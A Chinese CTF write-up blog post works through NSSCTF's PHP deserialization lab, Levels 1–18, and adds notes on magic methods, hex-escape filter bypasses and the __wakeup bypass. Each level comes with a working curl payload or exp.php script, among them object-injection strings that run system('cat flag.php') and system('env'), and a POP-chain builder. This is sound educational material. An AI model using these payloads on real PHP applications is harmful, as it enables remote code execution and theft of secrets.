---
title: 反序列化靶场
published: 2026-01-15
pubDate: 2026-01-15
description: 反序列化 nssctf
pinned: false
tags: ["web"]
author: zsm
category: CTF-web
draft: false
licenseName: "MIT"
lang: "zh_CN"
---

## 前言

不会web不会web不会web不会web不会web不会web不会web不会web不会web不会web不会web不会web不会web不会web

我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手我要当web高手

## 靶机

### Level1

```php
<?php

class FLAG{
    public $flag_string = "NSSCTF{？？？？}";

    function __construct(){
        echo $this->flag_string;
    }
}

$code = $_POST['code'];

eval($code);
```

`function __construct()`的函数特性，当new一个东西的时候，会自动执行这个函数，所以post发送`new FLAG();`就会执行flag函数了，就有flag了

> payload: curl -X POST -d "code=new FLAG();" http://node6.anna.nssctf.cn:22455/Level1/index.php

### Level2

```php
<?php

error_reporting(0);

 $flag_string = "NSSCTF{？？？？}";

 class FLAG{
        public $free_flag = "???";

        function get_free_flag(){
            echo $this->free_flag;
        }
    }
$target = new FLAG();

$code = $_POST['code'];

if(isset($code)){
       eval($code);
       $target->get_free_flag();
}
else{
    highlight_file('source');
}
Now Flag is ???
```

`->`符号可以修改指向的变量，但是这种方法对public的才有作用，如果是protected 和 private需要更复杂的方法。

那么这个题，`$flag_string`赋值给`$free_flag`，这样eval执行就可以输出出来了。

> payload: curl -X POST -d "code=\$target->free_flag=\$flag_string;" http://node1.anna.nssctf.cn:25202/Level2/index.php

### Level3

```php
<?php

class FLAG{
    public $public_flag = "NSSCTF{?";
    protected $protected_flag = "?";
    private $private_flag = "?}";

    function get_protected_flag(){
        return $this->protected_flag;
    }

    function get_private_flag(){
        return $this->private_flag;
    }
}

class SubFLAG extends FLAG{
    function show_protected_flag(){
        return $this->protected_flag;
    }

    function show_private_flag(){
        return $this->private_flag;
    }
}

$target = new FLAG();
$sub_target = new SubFLAG();


$code = $_POST['code'];

if(isset($code)){
    eval($code);
} else {
    highlight_file(__FILE__);
    echo "Trying to get FLAG...<br>";
    echo "Public Flag: ".$target->public_flag."<br>";
    echo "Protected Flag:".$target->protected_flag ."<br>";
    echo "Private Flag:".$target->private_flag ."<br>";
}

?>
Trying to get FLAG...
Public Flag: NSSCTF{se3_me_
Protected Flag: Error: Cannot access protected property FLAG:: in ?
Private Flag: Error: Cannot access private property FLAG:: in ?
...Wait,where is the flag?
```

看变量类型`public protected private`，主要是继承和访问权限不同。

`SubFLAG`函数继承了`FLAG`，受保护变量`protected_flag`是可以继承的，所以两个get_xxx函数可以访问，`get_private_flag`可以访问`private_flag`，私有变量不能继承。而对象中函数的调用和值的访问类似，也通过 -> 符号实现：$对象名 -> 函数名();

> payload: curl -X POST -d "code=echo \$target->public_flag.\$target->get_protected_flag().\$target->get_private_flag();" http://node1.anna.nssctf.cn:26490/Level3/index.php

### Level4

```php
<?php

class FLAG3{
    private $flag3_object_array = array("？","？");
}

class FLAG{
     private $flag1_string = "？";
     private $flag2_number = '?';
     private $flag3_object;

    function __construct() {
        $this->flag3_object = new FLAG3();
    }
}

$flag_is_here = new FLAG();


$code = $_POST['code'];

if(isset($code)){
    eval($code);
} else {
    highlight_file(__FILE__);
}
```

`flag_is_here`存了flag，用`serialize`拉出来`flag_is_here`，无视private限制，拉出来`flag1_string`，发现`flag3_object`是另一个对象，于是又跳`FLAG3`类里提取数组内容。

> payload: curl -X POST -d "code=echo serialize(\$flag_is_here);" http://node1.anna.nssctf.cn:25610/Level4/index.php --output -

### Level5

```php
<?php

class a_class{
    public $a_value = "NSSCTF";
}
$a_object = new a_class();
$a_array = array(a=>"Hello",b=>"CTF");
$a_string = "NSSCTF";
$a_number = 678470;
$a_boolean = true;
$a_null = null;

See How to serialize:
a_object: O:7:"a_class":1:{s:7:"a_value";s:6:"NSSCTF";}
a_array: a:2:{s:1:"a";s:5:"Hello";s:1:"b";s:3:"CTF";}
a_string: s:6:"NSSCTF";
a_number: i:678470;
a_boolean: b:1;
a_null: N;
Now your turn!
<?php

$your_object = unserialize($_POST['o']);
$your_array = unserialize($_POST['a']);
$your_string = unserialize($_POST['s']);
$your_number = unserialize($_POST['i']);
$your_boolean = unserialize($_POST['b']);
$your_NULL = unserialize($_POST['n']);

if(
    $your_boolean &&
    $your_NULL == null &&
    $your_string == "IWANT" &&
    $your_number == 1 &&
    $your_object->a_value == "FLAG" &&
    $your_array['a'] == "Plz" && $your_array['b'] == "Give_M3"
){
    echo $flag;
}
else{
    echo "You really know how to serialize?";
}


You really know how to serialize?
```

编写对应的变量进行序列化，将字符串赋给对应参数即可

exp.php

```php
<?php
class a_class
{
	public $a_value = "FLAG";
}

$a_object = new a_class();
$a_string = "IWANT";
$a_number = 1;
$a_boolean = true;
$a_null = null;
$a_array = array('a' => "Plz", 'b' => "Give_M3");
$flag = "o=" . serialize($a_object) . "&s=" . serialize($a_string) . "&a=" . serialize($a_array) . "&i=" . serialize($a_number) . "&b=" . serialize($a_boolean) . "&n=" . serialize($a_NULL);

echo $flag;
```

### Level6

```php
<?php

class protectedKEY{
    protected $protected_key;

    function get_key(){
        return $this->protected_key;
    }
}

class privateKEY{
    private $private_key;

    function get_key(){
        return $this->private_key;
    }

}
See Carfully~
protected's serialize: O%3A12%3A%22protectedKEY%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00protected_key%22%3BN%3B%7D
private's serialize: O%3A10%3A%22privateKEY%22%3A1%3A%7Bs%3A23%3A%22%00privateKEY%00private_key%22%3BN%3B%7D
<?php

$protected_key = unserialize($_POST['protected_key']);
$private_key = unserialize($_POST['private_key']);

if(isset($protected_key)&&isset($private_key)){
    if($protected_key->get_key() == "protected_key" && $private_key->get_key() == "private_key"){
        echo $flag;
    } else {
        echo "We Call it %00_Contr0l_Characters_NULL!";
    }
} else {
    highlight_file(__FILE__);
}
```

在 PHP 中，public、protected 和 private 属性在序列化后的表现形式各不相同，特别是不可见字符 %00（NULL 字节）的使用。

public在序列化后是属性名，正常显示，无特殊字符。
protected在序列化后是`\0*\0属性名`。
private在序列化后是`\0类名\0属性名`。

再看这个题`protectedKEY`和`privateKEY`，分别序列化就行，然后post传过去

> payload: curl -X POST -d 'protected_key=O%3A12%3A%22protectedKEY%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00protected_key%22%3Bs%3A13%3A%22protected_key%22%3B%7D&private_key=O%3A10%3A%22privateKEY%22%3A1%3A%7Bs%3A23%3A%22%00privateKEY%00private_key%22%3Bs%3A11%3A%22private_key%22%3B%7D' http://node1.anna.nssctf.cn:20561/Level6/index.php

exp.php

```php
<?php
class protectedKEY
{
	protected $protected_key = "protected_key";
}

class privateKEY
{
	private $private_key = "private_key";
}

echo urlencode(serialize(new protectedKEY()));
echo "\n";
echo urlencode(serialize(new privateKEY()));
```

### Level7

```php
<?php

class FLAG{
    public $flag_command = "echo 'Hello CTF!<br>';";

    function backdoor(){
        eval($this->flag_command);
    }
}

$unserialize_string = 'O:4:"FLAG":1:{s:12:"flag_command";s:24:"echo 'Hello World!<br>';";}';

$Instantiate_object = new FLAG(); // 实例化的对象

$Unserialize_object = unserialize($unserialize_string); // 反序列化的对象

$Instantiate_object->backdoor();

$Unserialize_object->backdoor();
'$Instantiate_object->backdoor()' will output:Hello CTF!
'$Unserialize_object->backdoor()' will output:Hello World!

<?php /* Now Your Turn */
unserialize($_POST['o'])->backdoor();
```

主要是点在于执行backdoor这里，我直接改成执行其他的就行，比如拿flag

> payload: curl -X POST -d "o=O%3A4%3A%22FLAG%22%3A1%3A%7Bs%3A12%3A%22flag%5Fcommand%22%3Bs%3A23%3A%22system%28%27cat%20flag%2Ephp%27%29%3B%22%3B%7D" http://node1.anna.nssctf.cn:26209/Level7/index.php

exp.php

```php
<?php
class FLAG
{
	public $flag_command = "system('cat flag.php');";
}

$a = new FLAG();
echo serialize($a);
```

### Leval8

```php
<?php

global $destruct_flag;
global $construct_flag;
$destruct_flag = 0;
$construct_flag = 0;

class FLAG {
    public $class_name;
    public function __construct($class_name)
    {
        $this->class_name = $class_name;
        global $construct_flag;
        $construct_flag++;
        echo "Constructor called " . $construct_flag . "<br>";
    }
    public function __destruct()
    {
        global $destruct_flag;
        $destruct_flag++;
        echo "Destructor called " . $destruct_flag . "<br>";
    }
}

/*Object created*/
$demo = new FLAG('demo');

/*Object serialized*/
$s = serialize($demo);

/*Object unserialized*/
$n = unserialize($s);

/*unserialized object destroyed*/
unset($n);

/*original object destroyed*/
unset($demo);

/*注意 此处为了方便演示为手动释放，一般情况下，当脚本运行完毕后，php会将未显式销毁的对象自动销毁，该行为也会调用析构函数*/

/*此外 还有比较特殊的情况: PHP的GC(垃圾回收机制)会在脚本运行时自动管理内存，销毁不被引用的对象:*/
new FLAG();
Object created:Constructor called 1
Object serialized: But Nothing Happen(:
Object unserialized:But nothing happened either):
serialized Object destroyed:Destructor called 1
original Object destroyed:Destructor called 2

This object ('new FLAG();') will be destroyed immediately because it is not assigned to any variable:Constructor called 2
Destructor called 3

Now Your Turn!, Try to get the flag!
<?php

class RELFLAG {

    public function __construct()
    {
        global $flag;
        $flag = 0;
        $flag++;
        echo "Constructor called " . $flag . "<br>";
    }
    public function __destruct()
    {
        global $flag;
        $flag++;
        echo "Destructor called " . $flag . "<br>";
    }
}

function check(){
    global $flag;
    if($flag > 5){
        echo "HelloCTF{???}";
    }else{
        echo "Check Detected flag is ". $flag;
    }
}

if (isset($_POST['code'])) {
    eval($_POST['code']);
    check();
}
```

主要是构造函数`__construct`和析构函数`__destruct`两个函数，以及GC机制。

构造函数只会在类实例化的时候 —— 也就是使用 new 的方法手动创建对象的时候才会触发，而通过反序列化创建的对象不会触发这一方法，这也是为什么，在前面的内容，我将反序列化的对象创建过程称作为 “还原”。

析构函数会在对象被回收的时候触发 —— 手动回收和自动回收。
手动：就是代码中演示的 unset 方法用于释放对象。
自分：对象没有值引用指向，或者脚本结束完全释放，具体看题目中的演示结合该部分文字应该不难理解。

题目要求 全局变量 标识符flag的值大于5，根据 \_\_destruct() 和 PHP GC 的特性，我们可以不断地去序列化和反序列化一个对象，然后不给该对象具体的引用以触发自动销毁机制。

> payload: curl -X POST -d 'code=unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG()))))))));' http://node1.anna.nssctf.cn:20197/Level8/index.php

### Level9

```php
<?php

class FLAG {
    var $flag_command = "echo 'HelloCTF';";
    public function __destruct()
    {
        eval ($this->flag_command);
    }
}

unserialize($_POST['o']);
```

执行命令就行，flag在env里面

> payload: curl -X POST -d 'o=O%3A4%3A%22FLAG%22%3A1%3A%7Bs%3A12%3A%22flag_command%22%3Bs%3A14%3A%22system%28%27env%27%29%3B%22%3B%7D' http://node1.anna.nssctf.cn:25326/Level9/index.php

exp.php

```php
<?php
class FLAG
{
	var $flag_command = "system('env');";
}
$exp = "o=" . urlencode(serialize(new FLAG()));
echo $exp;
```

### Level10

```php
<?php

error_reporting(0);

class FLAG{
    function __wakeup() {
        include 'flag.php';
        echo $flag;
    }
}

if(isset($_POST['o']))
{
    unserialize($_POST['o']);
}else {
    highlight_file(__FILE__);
}
?>
```

这才是记忆里面的反序列化，`__wakeup()`是魔术方法，`unserialize()`会检查是否存在`__wakeup()`方法，如果存在，则会先调用它，预先准备对象需要的资源。

经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。

> payload: curl -X POST -d 'o=O:4:"FLAG":0:{}' http://node1.anna.nssctf.cn:22652/Level10/index.php

exp.php

```php
<?php
class FLAG {}

$obj = new FLAG();
echo urldecode(serialize($obj));
```

### Level11

```php
<?php

error_reporting(0);

include 'flag.php';

class FLAG {
    public $flag = "FAKEFLAG";

    public function  __wakeup(){
        global $flag;
        $flag = NULL;
    }
    public function __destruct(){
        global $flag;
        if ($flag !== NULL) {
            echo $flag;
        }else
        {
            echo "sorry,flag is gone!";
        }
    }
}

if(isset($_POST['o']))
{
    unserialize($_POST['o']);
}else {
    highlight_file(__FILE__);
    phpinfo();
}

?>
```

知名漏洞`CVE-2016-7124`，找点博客看看就行了

> payload: curl -X POST -d 'o=O%3A4%3A%22FLAG%22%3A2%3A%7Bs%3A4%3A%22flag%22%3Bs%3A8%3A%22FAKEFLAG%22%3B%7D' http://node1.anna.nssctf.cn:26544/Level11/index.php

exp.php

```php
<?php
class FLAG
{
	public $flag = "FAKEFLAG";

	public function  __wakeup()
	{
		global $flag;
		$flag = NULL;
	}
	public function __destruct()
	{
		global $flag;
		if ($flag !== NULL) {
			echo $flag;
		} else {
			echo "sorry,flag is gone!";
		}
	}
}

echo serialize(new FLAG());
```

### Level12

```php
<?php

class FLAG {

    private $f;
    private $l;
    protected $a;
    public  $g;
    public $x,$y,$z;

    public function __sleep() {
        return ['x','y','z'];
    }
}

class CHALLENGE extends FLAG {

    public $h,$e,$l,$I,$o,$c,$t,$f;

    function chance() {
        return $_GET['chance'];
    }
    public function __sleep() {
        /* FLAG is $h + $e + $l + $I + $o + $c + $t + $f + $f + $l + $a + $g */
        $array_list = ['h','e','l','I','o','c','t','f','f','l','a','g'];
        $_=array_rand($array_list);$__=array_rand($array_list);
        return array($array_list[$_],$array_list[$__],$this->chance());
    }

}

$FLAG = new FLAG();
echo serialize($FLAG);

echo serialize(new CHALLENGE());


If you serialize FLAG, you will just get x,y,z
O:4:"FLAG":3:{s:1:"x";N;s:1:"y";N;s:1:"z";N;}
------ 每次请求会随机返回两个属性，你也可以用 chance 来指定你想要的属性 ------
Now __sleep()'s return parameters is array('I','o','you shuold use it')
O:9:"CHALLENGE":3:{s:1:"I";s:4:"_is_";s:1:"o";s:7:"called_";s:17:"you shuold use it";N;}
```

`serialize()`函数会检查类中是否存在一个魔术方法`__sleep()`。如果存在，该方法会先被调用，然后才执行序列化操作。

- 必要的返回内容：该方法必须返回一个数组: return array('属性1', '属性2', '属性3') / return ['属性1', '属性2', '属性3']，数组中的属性名将决定哪些变量将被序列化，当属性被 static 修饰时，无论有无都无法序列化该属性。
- 私有属性命名：如果需要返回父类中的私有属性，需要使用序列化中的特殊格式 - %00父类名称%00变量名 (%00 是 ASCII 值为 0 的空字符 null,在代码内我们也可以通过 "\0" - 注意在双引号中，PHP 才会解析转义字符和变量。)。
- 未返回任何内容：如果 \_\_sleep() 方法未返回任何内容或返回非数组类型，会触发 E_NOTICE 级别的错误，并且对象会被序列化为 null 空值。

这个题我们在请求的时候会返回两个数组，而这两个随机数组会决定我们看到的序列化字符串中涉及的变量，因此每次请求得到的字符串是不一样的。

`$array_list = ['h','e','l','I','o','c','t','f','f','l','a','g'];`每一次随机的字符串都是单字符 —— 这也就意味着，当他调用父类对象中的私有属性时无法显示，因为前面我们说到：“如果需要返回父类中的私有属性，需要使用序列化中的特殊格式 - `%00父类名称%00变量名”`。看方法`chance`，自定义反序列化的内容。

`$this->chance()`会读取chance()表示的变量名，而我们的flag组成如下，即我们收集12个变量即可

> payload: curl http://node1.anna.nssctf.cn:22271/Level12/index.php?chance=h等

### Level13

```php
<?php

class FLAG {
    function __toString() {
        echo "I'm a string ~~~";
        include 'flag.php';
        return $flag;
    }
}

$obj = new FLAG();

if(isset($_POST['o'])) {
    eval($_POST['o']);
} else {
    highlight_file(__FILE__);
}
```

主要点在于`__toString`，把这玩意当作字符串执行，那么就会把flag包含进去，自然输出出来了

> payload: curl -X POST -d 'o=$a=new FLAG();echo $a;' http://node1.anna.nssctf.cn:21007/Level13/index.php

### Level14

```php
<?php

class FLAG{
    function __invoke($x) {
        if ($x == 'get_flag') {
            include 'flag.php';
            echo $flag;
        }
    }
}

$obj = new FLAG();

if(isset($_POST['o'])) {
    eval($_POST['o']);
} else {
    highlight_file(__FILE__);
}
```

`__invoke`函数，定义了`get_flag`，那么我们执行这个就行

> payload: curl -X POST -d 'o=$a=new FLAG();$a('get_flag');' http://node1.anna.nssctf.cn:27354/Level14/index.php

### Level15

```php
<?php

/* FLAG in flag.php */

class A {
    public $a;
    public function __construct($a) {
        $this->a = $a;
    }
}
class B {
    public $b;
    public function __construct($b) {
        $this->b = $b;
    }
}
class C {
    public $c;
    public function __construct($c) {
        $this->c = $c;
    }
}

class D {
    public $d;
    public function __construct($d) {
        $this->d = $d;
    }
    public function __wakeUp() {
        $this->d->action();
    }
}

class destnation {
    var $cmd;
    public function __construct($cmd) {
        $this->cmd = $cmd;
    }
    public function action(){
        eval($this->cmd->a->b->c);
    }
}

if(isset($_POST['o'])) {
    unserialize($_POST['o']);
} else {
    highlight_file(__FILE__);
}
```

核心点在于

```php
public function action(){
    eval($this->cmd->a->b->c);
}
```

pop链倒推bro，D里面有`__wakeUp`可以调用，而`unserialize`就是起点

exp.php

```php
<?php
class A
{
	public $a;
}
class B
{
	public $b;
}
class C
{
	public $c;
}
class D
{
	public $d;
}
class destnation
{
	var $cmd;
}

$objC = new C();
$objC->c = "system('cat flag.php');";
$objB = new B();
$objB->b = $objC;
$objA = new A();
$objA->a = $objB;

$dest = new destnation();
$dest->cmd = $objA;
$payload = new D();
$payload->d = $dest;

echo urlencode(serialize($payload));
```

然后发过去告诉我flag在env里面，改一下发过去就行

### Level16

```php
<?php

class A {
    public $a;
    public function __invoke() {
            include $this->a;
            return $flag;
    }
}

class B {
    public $b;
    public function __toString() {
        $f = $this->b;
        return $f();
    }
}


class INIT {
    public $name;
    public function __wakeUp() {
        echo $this->name.' is awake!';
    }
}

if(isset($_POST['o'])) {
    unserialize($_POST['o']);
} else {
    highlight_file(__FILE__);
}
```

A这指向flag即可，`__toString()`可以当作跳板去执行A

exp.php

```php
<?php
class A
{
	public $a = 'flag.php';
}

class B
{
	public $b;
}

class INIT
{
	public $name;
}

$objA = new A();
$objB = new B();
$objB->b = $objA;
$payload = new INIT();
$payload->name = $objB;

echo urlencode(serialize($payload));
```

> payload: curl -X POST -d 'o=O%3A4%3A%22INIT%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A1%3A%22b%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D%7D' http://node6.anna.nssctf.cn:26176/Level16/index.php

### Level17

```php
Class A is NULL: 'O:1:"A":0:{}'
Class B is a class with 3 properties: 'O:1:"B":3:{s:1:"a";s:5:"Hello";s:4:"*b";s:3:"CTF";s:4:"Bc";s:10:"FLAG{TEST}";}'
After replace B with A,we unserialize it and dump :
object(A)#1 (3) { ["a"]=> string(5) "Hello" ["b":protected]=> string(3) "CTF" ["c":"A":private]=> string(10) "FLAG{TEST}" } <?php

class A {

}
echo "Class A is NULL: '".serialize(new A())."'<br>";

class B {
    public $a = "Hello";
    protected $b = "CTF";
    private $c = "FLAG{TEST}";
}
echo "Class B is a class with 3 properties: '".serialize(new B())."'<br>";

$serliseString = serialize(new B());

$serliseString = str_replace('B', 'A', $serliseString);

echo "After replace B with A,we unserialize it and dump :<br>";
var_dump(unserialize($serliseString));

if(isset($_POST['o'])) {
    $a = unserialize($_POST['o']);
    if ($a instanceof A && $a->helloctfcmd == "get_flag") {
        include 'flag.php';
        echo $flag;
    } else {
        echo "what's rule?";
    }
} else {
    highlight_file(__FILE__);
}
```

本地搞个A，去搞这个helloctfcmd这个就行

exp.php

```php
<?php

class A
{
	public $helloctfcmd = "get_flag";
}

echo urlencode(serialize(new A()));
```

> payload: curl -X POST -d 'o=O%3A1%3A%22A%22%3A1%3A%7Bs%3A11%3A%22helloctfcmd%22%3Bs%3A8%3A%22get_flag%22%3B%7D' http://node6.anna.nssctf.cn:28084/Level17/index.php --output -

### Level18

```php
<?php

highlight_file(__FILE__);

class Demo {
    public $a = "Hello";
    public $b = "CTF";
    public $key = 'GET_FLAG";}FAKE_FLAG';
}

class FLAG {

}

$serliseStringDemo = serialize(new Demo());

$target = $_GET['target'];
$change = $_GET['change'];

$serliseStringFLAG = str_replace($target, $change, $serliseStringDemo);

$FLAG = unserialize($serliseStringFLAG);

if ($FLAG instanceof FLAG && $FLAG->key == 'GET_FLAG') {
    echo $flag;
} SerliseStringDemo:'O:4:"Demo":3:{s:1:"a";s:5:"Hello";s:1:"b";s:3:"CTF";s:3:"key";s:20:"GET_FLAG";}FAKE_FLAG";}'
Change SOMETHING TO GET FLAGYour serliaze string is O:4:"Demo":3:{s:1:"a";s:5:"Hello";s:1:"b";s:3:"CTF";s:3:"key";s:20:"GET_FLAG";}FAKE_FLAG";}
And Here is object(Demo)#1 (3) { ["a"]=> string(5) "Hello" ["b"]=> string(3) "CTF" ["key"]=> string(20) "GET_FLAG";}FAKE_FLAG" }
```

主要是反序列化的“截断”特性，如果当成员属性的数量，名称长度，内容长度均一致时，在读完指定的属性后遇到了`}`，他就会认为已经结束了，就会忽略后面所有的字符。

当前的 key 部分是`s:3:"key";s:20:"GET_FLAG";}FAKE_FLAG"`如果我们把 s:20 改成 s:8，那么就会执行到`GET_FLAG`

> payload: curl 'http://node6.anna.nssctf.cn:22502/Level18/index.php?target=Demo%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A5%3A%22Hello%22%3Bs%3A1%3A%22b%22%3Bs%3A3%3A%22CTF%22%3Bs%3A3%3A%22key%22%3Bs%3A20&change=FLAG%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bs%3A5%3A%22Hello%22%3Bs%3A1%3A%22b%22%3Bs%3A3%3A%22CTF%22%3Bs%3A3%3A%22key%22%3Bs%3A8'

## 一些知识点

### 魔术函数：

```
__construct() 当一个对象创建时被调用，反序列化不触发
__destruct()  当一个对象销毁时被调用
__toString()  当一个对象被当作一个字符串使用，比如echo输出或用 . 和字符串拼接
__call()      当调用的方法不存在时触发
__invoke()    当一个对象被当作函数调用时触发
__wakeup()    反序列化时自动调用
__get()       类中的属性私有或不存在触发
__set()       类中的属性私有或不存在触发
```

### 反序列化十六进制绕过关键字

```
在反序列化时，序列化中的十六进制会被转化成字母
当过滤了c2e38 ，即可用 \63\32\65\33\38 替代，S解析十六进制
username:y1ng\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0
password:";S:11:"\00*\00password";O:8:"Hacker_A":1:{S:5:"\63\32\65\33\38";O:8:"Hacker_B":1:{S:5:"\63\32\65\33\38";O:8:"Hacker_C":1:{s:4:"name";s:4:"test";}}};s:1:"a";s:0:"

\00 会被替换为 %00
\65 会被替换为 e

过滤了%00，可用S来代替序列化字符串的s来绕过，在S情况下\00 会被解析成%00
```

序列化时类中私有变量和受保护变量，php7.1+ 对属性并不敏感，public 也可用于protected

> private反序列化后是%00(类名)%00(变量名)，protect是%00\*%00(变量名)

### `__wakeup()`绕过

适用版本PHP 5 < 5.6.25，PHP 7 < 7.0.10

```php
<?php
class xctf
{
    public $flag = "111";
    public function __wakeup()
    {
        exit('bad requests'); // 如果执行了该函数，程序会直接退出
    }
}
//echo serialize(new xctf());
echo unserialize($_GET['code']); // 接收 code 参数并反序列化
echo "flag{****}"; // 目标：绕过 exit 并执行到这里
?>
```

正确的序列化是`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`，1代表一个属性，触发`__wakeup()`，导致退出。

改成`O:4:"xctf":2:{s:4:"flag";s:3:"111";}`，改成2个属性，因为实际属性只有一个，但声明有两个，PHP 认为格式错误，从而绕过了`__wakeup()`，导致继续执行，输出flag

## 总结

慢慢学慢慢学慢慢学慢慢学慢慢学慢慢学慢慢学慢慢学
